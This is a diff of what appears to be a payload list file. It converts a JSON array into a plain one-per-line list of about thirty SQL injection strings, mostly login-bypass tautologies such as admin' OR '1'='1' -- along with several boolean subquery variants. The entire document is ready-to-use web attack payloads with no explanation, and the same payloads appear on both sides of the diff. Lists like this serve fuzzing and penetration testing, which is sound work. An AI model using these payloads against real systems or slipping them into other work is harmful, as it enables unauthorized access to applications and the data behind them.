@@ -1,32 +1,30 @@
-[
-    "admin\\' OR \\'1\\'=\\'1\\' --",
-    "admin\\' OR \\'1\\'=\\'1\\' /*",
-    "\\' OR \\'1\\'=\\'1\\'--",
-    "\\' OR \\'1\\'=\\'1\\' /*",
-    "admin\\' OR \\'1\\'=\\'1\\'--",
-    "admin\\' OR \\'1\\'=\\'1\\'/*",
-    "admin\\' OR \\'1\\'=\\'1\\';--",
-    "admin\\' OR \\'1\\'=\\'1\\'; #",
-    "admin\\' OR \\'1\\'=\\'1\\'; /*",
-    "\\' OR \\'1\\'=\\'1\\';--",
-    "\\' OR \\'1\\'=\\'1\\'; #",
-    "\\' OR \\'1\\'=\\'1\\'/*",
-    "admin\\' OR 1=1--",
-    "admin\\' OR 1=1/*",
-    "1\\' OR \\'1\\'=\\'1\\'--",
-    "\\' OR \\'1\\'=\\'1\\'--",
-    "\\' OR \\'1\\'=\\'1\\' /*",
-    "1\\' OR 1=1--",
-    "1\\' OR 2>1--",
-    "1\\' OR \\'a\\'=\\'a\\'--",
-    "1\\' OR 1=1/*",
-    "1\\' OR 2>1/*",
-    "1\\' OR \\'a\\'=\\'a\\'/*",
-    "1\\' OR 1=1--+",
-    "1\\' OR 2>1--+",
-    "1\\' OR \\'a\\'=\\'a\\'--+",
-    "1\\' OR (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)--",
-    "1\\' OR (SELECT 1 FROM users WHERE username=\\'admin\\' AND password=\\'wrong\\') IS NULL--",
-    "1\\' OR (SELECT 1 WHERE 1=1) IS NOT NULL--",
-    "1\\' OR (EXISTS (SELECT 1 WHERE 1=1))--"
-]
+admin' OR '1'='1' --
+admin' OR '1'='1' /*
+' OR '1'='1'--
+' OR '1'='1' /*
+admin' OR '1'='1'--
+admin' OR '1'='1'/*
+admin' OR '1'='1';--
+admin' OR '1'='1'; #
+admin' OR '1'='1'; /*
+' OR '1'='1';--
+' OR '1'='1'; #
+' OR '1'='1'/*
+admin' OR 1=1--
+admin' OR 1=1/*
+1' OR '1'='1'--
+' OR '1'='1'--
+' OR '1'='1' /*
+1' OR 1=1--
+1' OR 2>1--
+1' OR 'a'='a'--
+1' OR 1=1/*
+1' OR 2>1/*
+1' OR 'a'='a'/*
+1' OR 1=1--+
+1' OR 2>1--+
+1' OR 'a'='a'--+
+1' OR (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)--
+1' OR (SELECT 1 FROM users WHERE username='admin' AND password='wrong') IS NULL--
+1' OR (SELECT 1 WHERE 1=1) IS NOT NULL--
+1' OR (EXISTS (SELECT 1 WHERE 1=1))--
